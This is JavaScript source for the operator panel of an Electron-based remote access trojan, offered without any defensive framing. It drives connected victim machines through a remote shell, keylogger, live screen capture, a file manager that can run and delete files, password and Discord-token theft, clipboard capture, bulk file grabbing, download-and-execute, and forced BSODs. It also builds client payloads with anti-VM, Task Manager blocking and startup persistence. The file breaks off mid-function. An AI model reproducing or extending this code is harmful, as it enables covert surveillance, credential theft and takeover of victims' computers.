const { ipcRenderer } = require('electron');

function windowControl(action) {
  ipcRenderer.send('window-' + action);
}

const navTabs = document.querySelectorAll('.nav-tab');
const tabContents = document.querySelectorAll('.tab-content');

navTabs.forEach(tab => {
  tab.addEventListener('click', () => {
    const targetTab = tab.getAttribute('data-tab');
    navTabs.forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    tabContents.forEach(content => content.classList.remove('active'));
    const targetContent = document.getElementById('content-' + targetTab);
    if (targetContent) targetContent.classList.add('active');
  });
});

let clients = {};
let selectedClientId = null;
let contextClientId = null;
let serverRunning = false;
let currentFmPath = '';
let currentFmClientId = null;
let currentShellClientId = null;
let currentProcClientId = null;
let currentKeylogClientId = null;
let currentSsClientId = null;
let currentSsData = null;
let processListCache = [];
let shellHistory = [];
let shellHistoryIndex = -1;

function toggleCheck(wrapper) {
  const checkbox = wrapper.querySelector('input[type="checkbox"]');
  checkbox.checked = !checkbox.checked;
}

async function startServer() {
  const portsInput = document.getElementById('listen-ports').value;
  const ports = portsInput.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p) && p > 0 && p <= 65535);

  if (ports.length === 0) {
    showToast('❌ Enter valid port numbers');
    return;
  }

  const results = await ipcRenderer.invoke('server-start-all', ports);
  serverRunning = true;
  document.getElementById('server-status-text').textContent = `Listening on ${ports.length} port(s)`;
  document.getElementById('server-status-text').style.color = '#22c55e';
  document.getElementById('server-dot').classList.add('online');
  showToast(`✅ Server started on port(s): ${ports.join(', ')}`);
  addLogEntry('SERVER', `Started listeners on ports: ${ports.join(', ')}`);
}

async function stopServer() {
  await ipcRenderer.invoke('server-stop-all');
  serverRunning = false;
  document.getElementById('server-status-text').textContent = 'Stopped';
  document.getElementById('server-status-text').style.color = 'var(--text-muted)';
  document.getElementById('server-dot').classList.remove('online');
  clients = {};
  renderClientTable();
  showToast('Server stopped');
  addLogEntry('SERVER', 'All listeners stopped');
}

function renderClientTable() {
  const tbody = document.getElementById('clients-tbody');
  const emptyState = document.getElementById('dashboard-empty');
  const clientList = Object.values(clients);

  if (clientList.length === 0) {
    tbody.innerHTML = '';
    emptyState.style.display = '';
    return;
  }

  emptyState.style.display = 'none';
  tbody.innerHTML = clientList.map(c => `
    <tr data-id="${c.id}" class="${c.selected ? 'selected' : ''}" oncontextmenu="onClientContextMenu(event, '${c.id}')">
      <td><input type="checkbox" ${c.selected ? 'checked' : ''} onchange="toggleClientSelect('${c.id}', this.checked)"></td>
      <td style="font-family:'JetBrains Mono',monospace;">${c.ip}</td>
      <td>${c.username || 'N/A'}</td>
      <td>${c.os || 'N/A'}</td>
      <td>${c.country || 'N/A'}</td>
      <td><span class="tag">${c.group || 'Default'}</span></td>
      <td><span style="color:#22c55e;">● Online</span></td>
      <td>${c.ping || 0}ms</td>
    </tr>
  `).join('');
}

function toggleClientSelect(clientId, selected) {
  if (clients[clientId]) {
    clients[clientId].selected = selected;
    ipcRenderer.invoke('client-select', clientId, selected);
    renderClientTable();
    updateSelectedCount();
  }
}

function selectAllClients(selected) {
  for (const id in clients) {
    clients[id].selected = selected;
    ipcRenderer.invoke('client-select', id, selected);
  }
  renderClientTable();
  updateSelectedCount();
}

function updateSelectedCount() {
  const count = Object.values(clients).filter(c => c.selected).length;
  document.getElementById('status-selected').textContent = count;
}

function getSelectedClients() {
  return Object.values(clients).filter(c => c.selected);
}

const contextMenu = document.getElementById('context-menu');

function onClientContextMenu(e, clientId) {
  e.preventDefault();
  e.stopPropagation();
  contextClientId = clientId;
  
  contextMenu.style.display = 'block'; 
  const menuHeight = contextMenu.offsetHeight || 400;
  contextMenu.style.display = ''; 
  
  const windowHeight = window.innerHeight;
  let top = e.pageY;
  if (top + menuHeight > windowHeight) {
    top = windowHeight - menuHeight - 10;
  }
  
  contextMenu.style.left = e.pageX + 'px';
  contextMenu.style.top = top + 'px';
  contextMenu.classList.add('visible');

  makeDraggable(contextMenu);
}

function makeDraggable(el) {
  let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
  el.onmousedown = dragMouseDown;

  function dragMouseDown(e) {
    e.preventDefault();
    pos3 = e.clientX;
    pos4 = e.clientY;
    document.onmouseup = closeDragElement;
    document.onmousemove = elementDrag;
  }

  function elementDrag(e) {
    e.preventDefault();
    pos1 = pos3 - e.clientX;
    pos2 = pos4 - e.clientY;
    pos3 = e.clientX;
    pos4 = e.clientY;
    el.style.top = (el.offsetTop - pos2) + "px";
    el.style.left = (el.offsetLeft - pos1) + "px";
  }

  function closeDragElement() {
    document.onmouseup = null;
    document.onmousemove = null;
  }
}

document.addEventListener('click', () => {
  contextMenu.classList.remove('visible');
});

document.addEventListener('contextmenu', (e) => {
  const row = e.target.closest('#clients-tbody tr');
  if (row) {
    const id = row.getAttribute('data-id');
    if (id) {
      e.preventDefault();
      onClientContextMenu(e, id);
    }
  }
});

function ctxAction(action) {
  contextMenu.classList.remove('visible');
  if (!contextClientId || !clients[contextClientId]) {
    showToast('❌ No client selected');
    return;
  }

  const client = clients[contextClientId];
  const clientName = `${client.username}@${client.ip}`;

  switch (action) {
    case 'remote-desktop':
      currentSsClientId = contextClientId;
      document.getElementById('ss-client-name').textContent = clientName;
      document.getElementById('ss-image').src = '';
      openModal('modal-screenshot');
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'screenshot' });
      addLogEntry('TASK', `Requesting screenshot from ${clientName}`);
      break;

    case 'file-manager':
      currentFmClientId = contextClientId;
      document.getElementById('fm-client-name').textContent = clientName;
      document.getElementById('fm-path-input').value = 'C:\\';
      document.getElementById('fm-file-list').innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-muted);">Loading...</div>';
      openModal('modal-filemanager');
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'file-list', path: 'C:\\' });
      addLogEntry('TASK', `Opening file manager for ${clientName}`);
      break;

    case 'process-manager':
      currentProcClientId = contextClientId;
      document.getElementById('proc-client-name').textContent = clientName;
      document.getElementById('proc-tbody').innerHTML = '';
      openModal('modal-process');
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'process-list' });
      addLogEntry('TASK', `Requesting process list from ${clientName}`);
      break;

    case 'shell':
      currentShellClientId = contextClientId;
      document.getElementById('shell-client-name').textContent = clientName;
      document.getElementById('shell-output').innerHTML = `<div class="shell-line"><span class="output">Connected to ${clientName}</span></div>`;
      document.getElementById('shell-input').value = '';
      shellHistory = [];
      shellHistoryIndex = -1;
      openModal('modal-shell');
      addLogEntry('TASK', `Remote shell opened for ${clientName}`);
      break;

    case 'keylogger':
      currentKeylogClientId = contextClientId;
      document.getElementById('kl-client-name').textContent = clientName;
      document.getElementById('keylog-output').innerHTML = '';
      openModal('modal-keylogger');
      addLogEntry('TASK', `Keylogger opened for ${clientName}`);
      break;

    case 'clipboard':
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'get-clipboard' });
      addLogEntry('TASK', `Requesting clipboard from ${clientName}`);
      break;

    case 'sysinfo':
      document.getElementById('sysinfo-client-name').textContent = clientName;
      document.getElementById('sysinfo-grid').innerHTML = '<span style="color:var(--text-muted);grid-column:1/-1;">Loading...</span>';
      openModal('modal-sysinfo');
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'system-info-detail' });
      addLogEntry('TASK', `Requesting system info from ${clientName}`);
      break;

    case 'msgbox':
      openModal('modal-msgbox');
      break;

    case 'open-url':
      openModal('modal-openurl');
      break;

    case 'dl-execute':
      openModal('modal-dlexec');
      break;

    case 'shutdown':
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'shutdown' });
      addLogEntry('TASK', `Shutdown sent to ${clientName}`);
      showToast(`⏻ Shutdown command sent to ${clientName}`);
      break;

    case 'restart':
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'restart' });
      addLogEntry('TASK', `Restart sent to ${clientName}`);
      showToast(`🔄 Restart command sent to ${clientName}`);
      break;

    case 'logoff':
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'logoff' });
      addLogEntry('TASK', `Log off sent to ${clientName}`);
      showToast(`🚪 Log off command sent to ${clientName}`);
      break;

    case 'bsod':
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'bsod' });
      addLogEntry('TASK', `BSOD sent to ${clientName}`);
      showToast(`💀 BSOD command sent to ${clientName}`);
      break;

    case 'uninstall-ask':
      openModal('modal-confirm-uninstall');
      break;

    case 'passwords':
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'get-passwords' });
      addLogEntry('TASK', `Recover passwords request sent to ${clientName}`);
      showToast('🔑 Recover passwords request sent');
      break;

    case 'discord-tokens':
      ipcRenderer.invoke('client-send-command', contextClientId, { type: 'get-discord-tokens' });
      addLogEntry('TASK', `Discord tokens request sent to ${clientName}`);
      showToast('🎮 Discord token request sent');
      break;
  }
}

function confirmUninstall() {
  if (!contextClientId) {
    closeModal();
    return;
  }
  ipcRenderer.invoke('client-send-command', contextClientId, { type: 'uninstall' });
  addLogEntry('TASK', `Uninstall sent to client ${contextClientId}`);
  showToast('🗑️ Uninstall command sent');
  closeModal();
}

function openModal(modalId) {
  document.getElementById('modal-overlay').classList.add('visible');
  document.getElementById(modalId).classList.add('visible');
  if (modalId === 'modal-shell') {
    setTimeout(() => document.getElementById('shell-input').focus(), 100);
  }
}

let screenshotInterval;

function closeModal() {
  document.getElementById('modal-overlay').classList.remove('visible');
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('visible'));
  
  if (screenshotInterval) clearInterval(screenshotInterval);
  const chk = document.getElementById('chk-ss-live');
  if (chk) chk.checked = false;
}

function requestScreenshot() {
  if (!currentSsClientId) return;
  ipcRenderer.invoke('client-send-command', currentSsClientId, { type: 'screenshot' });
  const btn = document.getElementById('btn-ss-refresh');
  if(btn) {
      btn.style.opacity = '0.7';
      setTimeout(() => btn.style.opacity = '1', 500);
  }
}

function toggleLiveScreenshot(checkbox) {
  if (checkbox.checked) {
    if (!currentSsClientId) { checkbox.checked = false; return; }
    requestScreenshot(); 
    screenshotInterval = setInterval(requestScreenshot, 1000); 
    showToast('🔴 Live Stream Started');
  } else {
    clearInterval(screenshotInterval);
    showToast('Live Stream Stopped');
  }
}

function saveScreenshot() {
  const img = document.getElementById('ss-image');
  if (!img.src || img.src.length < 100) { showToast('No image to save'); return; }
  const a = document.createElement('a');
  a.href = img.src;
  a.download = `screenshot_${Date.now()}.png`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}


document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeModal();
});

function sendShellCommand() {
  const input = document.getElementById('shell-input');
  const cmd = input.value.trim();
  if (!cmd || !currentShellClientId) return;

  shellHistory.push(cmd);
  shellHistoryIndex = shellHistory.length;

  const output = document.getElementById('shell-output');
  output.innerHTML += `<div class="shell-line"><span class="cmd">$&gt; ${escapeHtml(cmd)}</span></div>`;
  output.scrollTop = output.scrollHeight;

  ipcRenderer.invoke('client-send-command', currentShellClientId, { type: 'shell', command: cmd });
  input.value = '';
}

document.addEventListener('DOMContentLoaded', () => {
  const shellInput = document.getElementById('shell-input');
  if (shellInput) {
    shellInput.addEventListener('keydown', (e) => {
      if (e.key === 'ArrowUp' && shellHistory.length > 0) {
        shellHistoryIndex = Math.max(0, shellHistoryIndex - 1);
        shellInput.value = shellHistory[shellHistoryIndex] || '';
      } else if (e.key === 'ArrowDown' && shellHistory.length > 0) {
        shellHistoryIndex = Math.min(shellHistory.length, shellHistoryIndex + 1);
        shellInput.value = shellHistory[shellHistoryIndex] || '';
      }
    });
  }
});

function fmNavigate() {
  const pathInput = document.getElementById('fm-path-input');
  const fmPath = pathInput.value.trim();
  if (!fmPath || !currentFmClientId) return;
  currentFmPath = fmPath;
  document.getElementById('fm-file-list').innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-muted);">Loading...</div>';
  ipcRenderer.invoke('client-send-command', currentFmClientId, { type: 'file-list', path: fmPath });
}

function fmNavigateUp() {
  const pathInput = document.getElementById('fm-path-input');
  let fmPath = pathInput.value.trim();
  if (fmPath.includes('\\')) {
    fmPath = fmPath.replace(/\\[^\\]*$/, '') || 'C:\\';
  } else if (fmPath.includes('/')) {
    fmPath = fmPath.replace(/\/[^/]*$/, '') || '/';
  }
  pathInput.value = fmPath;
  fmNavigate();
}

function fmRefresh() {
  fmNavigate();
}

function fmOpenDir(dirPath) {
  document.getElementById('fm-path-input').value = dirPath;
  fmNavigate();
}

function fmDownloadFile(filePath) {
  if (!currentFmClientId) return;
  ipcRenderer.invoke('client-send-command', currentFmClientId, { type: 'file-download', path: filePath });
  showToast('📥 Downloading file...');
  addLogEntry('FILE', `Downloading: ${filePath}`);
}

function fmDeleteFile(filePath) {
  if (!currentFmClientId) return;
  ipcRenderer.invoke('client-send-command', currentFmClientId, { type: 'file-delete', path: filePath });
  showToast('🗑️ Deleting...');
  addLogEntry('FILE', `Deleting: ${filePath}`);
}

function fmRunFile(filePath) {
  if (!currentFmClientId) return;
  ipcRenderer.invoke('client-send-command', currentFmClientId, { type: 'run-file', path: filePath });
  showToast('▶ Running file...');
  addLogEntry('FILE', `Running: ${filePath}`);
}

async function fmUploadFile() {
  if (!currentFmClientId) return;
  const input = document.createElement('input');
  input.type = 'file';
  input.onchange = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = async (ev) => {
      const base64 = ev.target.result.split(',')[1];
      const destPath = (document.getElementById('fm-path-input').value + '\\' + file.name).replace(/\\\\/g, '\\');
      ipcRenderer.invoke('client-send-command', currentFmClientId, {
        type: 'file-upload',
        path: destPath,
        data: base64
      });
      showToast('⬆ Uploading ' + file.name + '...');
      addLogEntry('FILE', `Uploading: ${file.name} to ${destPath}`);
    };
    reader.readAsDataURL(file);
  };
  input.click();
}

function renderFileList(data) {
  const container = document.getElementById('fm-file-list');
  if (!data || !data.files) {
    container.innerHTML = '<div style="padding:20px;text-align:center;color:var(--red-400);">Error loading directory</div>';
    return;
  }

  currentFmPath = data.path;
  document.getElementById('fm-path-input').value = data.path;

  if (data.error) {
    container.innerHTML = `<div style="padding:20px;text-align:center;color:var(--red-400);">${escapeHtml(data.error)}</div>`;
    return;
  }

  const sorted = data.files.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  container.innerHTML = sorted.map(f => `
    <div class="fm-file-item" ${f.isDir ? `ondblclick="fmOpenDir('${escapeAttr(f.path)}')"` : ''}>
      <span class="fm-icon">${f.isDir ? '📁' : getFileIcon(f.name)}</span>
      <span class="fm-name ${f.isDir ? 'dir' : ''}">${escapeHtml(f.name)}</span>
      <span class="fm-size">${f.isDir ? '' : formatSize(f.size)}</span>
      <div class="fm-actions">
        ${!f.isDir ? `<button class="fm-action-btn" onclick="fmDownloadFile('${escapeAttr(f.path)}')" title="Download">⬇</button>` : ''}
        ${!f.isDir ? `<button class="fm-action-btn" onclick="fmRunFile('${escapeAttr(f.path)}')" title="Run">▶</button>` : ''}
        <button class="fm-action-btn" onclick="fmDeleteFile('${escapeAttr(f.path)}')" title="Delete">🗑</button>
      </div>
    </div>
  `).join('');
}

function refreshProcesses() {
  if (!currentProcClientId) return;
  document.getElementById('proc-tbody').innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-muted);">Loading...</td></tr>';
  ipcRenderer.invoke('client-send-command', currentProcClientId, { type: 'process-list' });
}

function renderProcessList(data) {
  processListCache = data || [];
  const tbody = document.getElementById('proc-tbody');
  const search = document.getElementById('proc-search').value.toLowerCase();

  const filtered = processListCache.filter(p => p.name.toLowerCase().includes(search));

  tbody.innerHTML = filtered.map(p => `
    <tr>
      <td>${escapeHtml(p.name)}</td>
      <td style="font-family:'JetBrains Mono',monospace;">${p.pid}</td>
      <td>${p.memory || 'N/A'}</td>
      <td><button class="btn btn-danger" style="padding:3px 8px;font-size:10px;" onclick="killProcess(${p.pid})">Kill</button></td>
    </tr>
  `).join('');
}

function filterProcesses() {
  renderProcessList(processListCache);
}

function killProcess(pid) {
  if (!currentProcClientId) return;
  ipcRenderer.invoke('client-send-command', currentProcClientId, { type: 'process-kill', pid });
  showToast(`Killing process ${pid}...`);
  addLogEntry('TASK', `Kill process PID ${pid}`);
}

function refreshScreenshot() {
  if (!currentSsClientId) return;
  document.getElementById('ss-image').src = '';
  ipcRenderer.invoke('client-send-command', currentSsClientId, { type: 'screenshot' });
  showToast('📸 Capturing screenshot...');
}

async function saveScreenshot() {
  if (!currentSsData) return;
  const saved = await ipcRenderer.invoke('save-file', 'screenshot.png', currentSsData);
  if (saved) {
    showToast('💾 Screenshot saved: ' + saved);
  }
}

function startKeylogger() {
  if (!currentKeylogClientId) return;
  ipcRenderer.invoke('client-send-command', currentKeylogClientId, { type: 'keylogger-start' });
  showToast('⌨️ Keylogger started');
  addLogEntry('TASK', 'Keylogger started');
}

function stopKeylogger() {
  if (!currentKeylogClientId) return;
  ipcRenderer.invoke('client-send-command', currentKeylogClientId, { type: 'keylogger-stop' });
  showToast('⌨️ Keylogger stopped');
  addLogEntry('TASK', 'Keylogger stopped');
}

function clearKeylog() {
  document.getElementById('keylog-output').innerHTML = '';
}

function sendMessageBox() {
  if (!contextClientId) return;
  const title = document.getElementById('msgbox-title').value;
  const text = document.getElementById('msgbox-text').value;
  const icon = document.getElementById('msgbox-icon').value;
  ipcRenderer.invoke('client-send-command', contextClientId, { type: 'messagebox', title, text, icon });
  showToast('💬 Message box sent');
  addLogEntry('TASK', `MessageBox sent: "${title}"`);
  closeModal();
}

function sendOpenUrl() {
  if (!contextClientId) return;
  const url = document.getElementById('openurl-url').value;
  ipcRenderer.invoke('client-send-command', contextClientId, { type: 'open-url', url });
  showToast('🌐 URL opened on client');
  addLogEntry('TASK', `Open URL: ${url}`);
  closeModal();
}

function sendDownloadExecute() {
  if (!contextClientId) return;
  const url = document.getElementById('dlexec-url').value;
  ipcRenderer.invoke('client-send-command', contextClientId, { type: 'download-execute', url });
  showToast('⬇️ Download & Execute sent');
  addLogEntry('TASK', `Download & Execute: ${url}`);
  closeModal();
}

function recoverPasswords(scope) {
  const cmd = { type: 'get-passwords' };
  if (scope === 'all') {
    ipcRenderer.invoke('client-send-to-all', cmd);
    showToast('🔓 Password recovery sent to all clients');
  } else {
    ipcRenderer.invoke('client-send-to-selected', cmd);
    showToast('🔓 Password recovery sent to selected clients');
  }
  addLogEntry('TASK', `Password recovery: ${scope}`);
}

function startFileGrab(scope) {
  const extensions = document.getElementById('grab-extensions').value;
  const maxSize = parseInt(document.getElementById('grab-maxsize').value) || 10;
  const dirs = [];
  if (document.getElementById('grab-desktop').checked) dirs.push('Desktop');
  if (document.getElementById('grab-documents').checked) dirs.push('Documents');
  if (document.getElementById('grab-downloads').checked) dirs.push('Downloads');
  if (document.getElementById('grab-pictures').checked) dirs.push('Pictures');

  const cmd = { type: 'grab-files', extensions, directories: dirs, maxSize };
  if (scope === 'all') {
    ipcRenderer.invoke('client-send-to-all', cmd);
    showToast('📥 File grab sent to all clients');
  } else {
    ipcRenderer.invoke('client-send-to-selected', cmd);
    showToast('📥 File grab sent to selected clients');
  }
  addLogEntry('TASK', `File grab started (${scope}): ${extensions}`);
}

async function saveAutoTasks() {
  const tasks = {
    keylogger: document.getElementById('auto-keylogger').checked,
    screenshot: document.getElementById('auto-screenshot').checked,
    passwords: document.getElementById('auto-passwords').checked,
    clipboard: document.getElementById('auto-clipboard').checked,
    webcam: document.getElementById('auto-webcam').checked,
    filegrab: document.getElementById('auto-filegrab').checked
  };
  await ipcRenderer.invoke('set-auto-tasks', tasks);
  showToast('💾 Auto tasks saved');
  addLogEntry('CONFIG', 'Auto tasks updated');
}

function requestAllScreenshots() {
  ipcRenderer.invoke('client-send-to-all', { type: 'screenshot' });
  showToast('📸 Screenshot request sent to all clients');
  addLogEntry('TASK', 'Requested screenshots from all clients');
}

async function buildClient() {
  const btn = document.getElementById('btn-build');
  const originalText = btn.innerHTML;
  btn.innerHTML = '<div class="spinner"></div> Building...';
  btn.disabled = true;
  btn.style.opacity = '0.7';

  const config = {
    ips: [],
    ports: [],
    groupName: document.getElementById('input-group-name').value,
    mutex: document.getElementById('input-mutex').value,
    filePath: document.getElementById('select-filepath').value,
    sleep: document.getElementById('input-sleep').value,
    antiVM: document.getElementById('chk-antivm').checked,
    blockTM: document.getElementById('chk-blocktm').checked,
    bsod: document.getElementById('chk-bsod').checked,
    startup: document.getElementById('chk-startup').checked,
    arch: document.querySelector('input[name="arch"]:checked').value,
    ipByLink: document.getElementById('ip-by-link').checked,
    ipLink: document.getElementById('input-ip-link').value,
    buildExe: document.getElementById('chk-build-exe').checked,
    noConsole: document.getElementById('chk-no-console').checked
  };

  document.querySelectorAll('#ip-list .list-item').forEach(item => {
    config.ips.push(item.textContent.trim());
  });
  document.querySelectorAll('#port-list .list-item').forEach(item => {
    config.ports.push(parseInt(item.textContent.trim()));
  });

  if (config.ips.length === 0) {
    showToast('❌ Add at least one IP address');
    btn.innerHTML = originalText;
    btn.disabled = false;
    btn.style.opacity = '1';
    return;
  }

  if (config.ports.length === 0) {
    showToast('❌ Add at least one port');
    btn.innerHTML = originalText;
    btn.disabled = false;
    btn.style.opacity = '1';
    return;
  }

  addLogEntry('BUILD', 'Starting build process...');

  try {
    const result = await ipcRenderer.invoke('build-client', config);
    if (result.success) {
      addLogEntry('BUILD', `✅ Build successful: ${result.filename}`);
      addLogEntry('BUILD', `Size: ${formatSize(result.size)} | Path: ${result.path}`);
      showToast(`✅ Build successful: ${result.filename}`);
    } else {
      addLogEntry('BUILD', `❌ Build failed: ${result.error}`);
      showToast(`❌ Build failed: ${result.error}`);
    }
  } catch (err) {
    addLogEntry('BUILD', `❌ Build error: ${err.message}`);
    showToast(`❌ Build error: ${err.message}`);
  }

  btn.innerHTML = originalText;
  btn.disabled = false;
  btn.style.opacity = '1';
}

async function openBuildsFolder() {
  await ipcRenderer.invoke('open-builds-folder');
  showToast('📂 Builds folder opened');
}

function addIP() {
  const input = document.getElementById('input-server-ip');
  const val = input.value.trim();
  if (!val) return;
  const list = document.getElementById('ip-list');
  const items = list.querySelectorAll('.list-item');
  for (let item of items) {
    if (item.textContent.trim() === val) { showToast('IP already exists'); return; }
  }
  const item = document.createElement('div');
  item.className = 'list-item';
  item.textContent = val;
  item.onclick = function() { selectListItem(this); };
  list.appendChild(item);
  input.value = '';
  showToast('IP added: ' + val);
}

function removeIP() {
  const list = document.getElementById('ip-list');
  const selected = list.querySelector('.list-item.selected');
  if (selected) { selected.remove(); showToast('IP removed'); }
}

function addPort() {
  const input = document.getElementById('input-server-port');
  const val = parseInt(input.value);
  if (isNaN(val) || val < 1 || val > 65535) { showToast('Invalid port (1-65535)'); return; }
  const list = document.getElementById('port-list');
  const items = list.querySelectorAll('.list-item');
  for (let item of items) {
    if (item.textContent.trim() === String(val)) { showToast('Port already exists'); return; }
  }
  const item = document.createElement('div');
  item.className = 'list-item';
  item.textContent = val;
  item.onclick = function() { selectListItem(this); };
  list.appendChild(item);
  showToast('Port added: ' + val);
}

function removePort() {
  const list = document.getElementById('port-list');
  const selected = list.querySelector('.list-item.selected');
  if (selected) { selected.remove(); showToast('Port removed'); }
}

function adjustPort(delta) {
  const input = document.getElementById('input-server-port');
  let val = parseInt(input.value) || 0;
  input.value = Math.max(1, Math.min(65535, val + delta));
}

function adjustSleep(delta) {
  const input = document.getElementById('input-sleep');
  let val = parseInt(input.value) || 0;
  input.value = Math.max(0, val + delta);
}

function selectListItem(item) {
  const siblings = item.parentElement.querySelectorAll('.list-item');
  siblings.forEach(s => s.classList.remove('selected'));
  item.classList.add('selected');
}

document.getElementById('input-server-ip').addEventListener('keydown', (e) => { if (e.key === 'Enter') addIP(); });
document.getElementById('input-server-port').addEventListener('keydown', (e) => { if (e.key === 'Enter') addPort(); });

document.getElementById('icon-file').addEventListener('change', function(e) {
  const file = e.target.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = function(ev) {
      document.getElementById('icon-preview').innerHTML = `<img src="${ev.target.result}" style="width:100%;height:100%;object-fit:contain;border-radius:4px;">`;
    };
    reader.readAsDataURL(file);
    showToast('Icon loaded: ' + file.name);
  }
});

let toastTimeout;
function showToast(message) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.classList.add('show');
  clearTimeout(toastTimeout);
  toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
}

function addLogEntry(type, message) {
  const log = document.getElementById('task-log');
  const now = new Date();
  const timeStr = now.toTimeString().substring(0, 8);
  const entry = document.createElement('div');
  entry.className = 'log-entry';
  entry.innerHTML = `<span class="log-time">[${timeStr}]</span><span class="log-type">[${type}]</span> ${message}`;
  log.appendChild(entry);
  log.scrollTop = log.scrollHeight;
}

function clearLog() {
  document.getElementById('task-log').innerHTML = '';
  addLogEntry('SYSTEM', 'Log cleared');
}

ipcRenderer.on('log', (event, data) => {
  addLogEntry(data.type, data.message);
});

ipcRenderer.on('client-connected', (event, data) => {
  clients[data.id] = {
    id: data.id,
    ip: data.ip,
    port: data.port,
    username: 'Connecting...',
    hostname: '',
    os: '',
    country: '',
    group: 'Default',
    ping: 0,
    selected: false
  };
  renderClientTable();
  showToast(`🔌 New connection from ${data.ip}`);
});

ipcRenderer.on('client-disconnected', (event, clientId) => {
  const client = clients[clientId];
  if (client) {
    showToast(`❌ ${client.username}@${client.ip} disconnected`);
  }
  delete clients[clientId];
  renderClientTable();
  updateSelectedCount();
});

ipcRenderer.on('client-info', (event, data) => {
  if (clients[data.id]) {
    Object.assign(clients[data.id], data);
    renderClientTable();
  }
});

ipcRenderer.on('shell-output', (event, data) => {
  if (data.clientId === currentShellClientId) {
    const output = document.getElementById('shell-output');
    if (data.data.output) {
      output.innerHTML += `<div class="shell-line"><span class="output">${escapeHtml(data.data.output)}</span></div>`;
    }
    if (data.data.error) {
      output.innerHTML += `<div class="shell-line"><span class="error">${escapeHtml(data.data.error)}</span></div>`;
    }
    output.scrollTop = output.scrollHeight;
  }
});

ipcRenderer.on('screenshot', (event, data) => {
  if (data.data) {
    currentSsData = data.data;
    const img = document.getElementById('ss-image');
    if (img) {
      img.src = 'data:image/png;base64,' + data.data;
    }
    updateThumbnail(data.clientId, data.data);
  }
  addLogEntry('TASK', 'Screenshot received');
});

ipcRenderer.on('file-list', (event, data) => {
  if (data.clientId === currentFmClientId) {
    renderFileList(data.data);
  }
});

ipcRenderer.on('file-download', (event, data) => {
  if (data.data && data.data.content) {
    ipcRenderer.invoke('save-file', data.data.name, data.data.content).then(saved => {
      if (saved) {
        showToast('💾 File saved: ' + saved);
        addLogEntry('FILE', `File saved: ${saved}`);
      }
    });
  } else if (data.data && data.data.error) {
    showToast('❌ Download error: ' + data.data.error);
  }
});

ipcRenderer.on('file-upload-result', (event, data) => {
  if (data.data && data.data.success) {
    showToast('✅ Upload complete');
    if (data.data.deleted) {
      showToast('🗑️ File deleted');
    }
    fmRefresh();
  } else if (data.data && data.data.error) {
    showToast('❌ Error: ' + data.data.error);
  }
});

ipcRenderer.on('process-list', (event, data) => {
  if (data.clientId === currentProcClientId) {
    renderProcessList(data.data);
  }
});

ipcRenderer.on('process-kill-result', (event, data) => {
  if (data.data && data.data.success) {
    showToast(`✅ Process ${data.data.pid} killed`);
    setTimeout(() => refreshProcesses(), 500);
  } else {
    showToast('❌ Failed to kill process: ' + (data.data?.error || 'Unknown'));
  }
});

ipcRenderer.on('keylogger-data', (event, data) => {
  const output = document.getElementById('keylog-output');
  if (output) {
    output.innerHTML += escapeHtml(data.data);
    output.scrollTop = output.scrollHeight;
  }
  addLogEntry('KEYLOG', `Data from ${data.clientId}`);
});

ipcRenderer.on('passwords', (event, data) => {
  const tbody = document.getElementById('passwords-tbody');
  const emptyState = document.getElementById('passwords-empty');
  const client = clients[data.clientId];
  const clientName = client ? `${client.username}@${client.ip}` : data.clientId;

  if (data.data && data.data.length > 0) {
    emptyState.style.display = 'none';
    data.data.forEach(p => {
      const row = document.createElement('tr');
      row.innerHTML = `
        <td>${escapeHtml(clientName)}</td>
        <td>${escapeHtml(p.app || '')}</td>
        <td>${escapeHtml(p.note || '')}</td>
        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;">${escapeHtml(p.path || '')}</td>
      `;
      tbody.appendChild(row);
    });
    showToast(`🔑 Passwords received from ${clientName}`);
  }
});

ipcRenderer.on('clipboard-data', (event, data) => {
  const client = clients[data.clientId];
  const clientName = client ? `${client.username}@${client.ip}` : data.clientId;
  showToast(`📋 Clipboard from ${clientName}: ${data.data.substring(0, 50)}${data.data.length > 50 ? '...' : ''}`);
  addLogEntry('CLIPBOARD', `${clientName}: ${data.data.substring(0, 100)}`);
});

ipcRenderer.on('grabbed-files', (event, data) => {
  const tbody = document.getElementById('files-tbody');
  const emptyState = document.getElementById('files-empty');
  const client = clients[data.clientId];
  const clientName = client ? `${client.username}@${client.ip}` : data.clientId;

  if (data.data && data.data.length > 0) {
    emptyState.style.display = 'none';
    data.data.forEach(f => {
      const row = document.createElement('tr');
      row.innerHTML = `
        <td>${escapeHtml(clientName)}</td>
        <td>${escapeHtml(f.name)}</td>
        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;">${escapeHtml(f.path)}</td>
        <td>${formatSize(f.size)}</td>
      `;
      tbody.appendChild(row);
    });
    showToast(`📁 ${data.data.length} files found from ${clientName}`);
  }
});

ipcRenderer.on('system-info-detail', (event, data) => {
  const grid = document.getElementById('sysinfo-grid');
  const info = data.data;
  if (!info) return;

  grid.innerHTML = '';
  const fields = [
    ['Hostname', info.hostname],
    ['Username', info.username],
    ['OS', info.os],
    ['Platform', info.platform],
    ['Architecture', info.arch],
    ['CPU Model', info.cpuModel],
    ['CPU Cores', info.cpus],
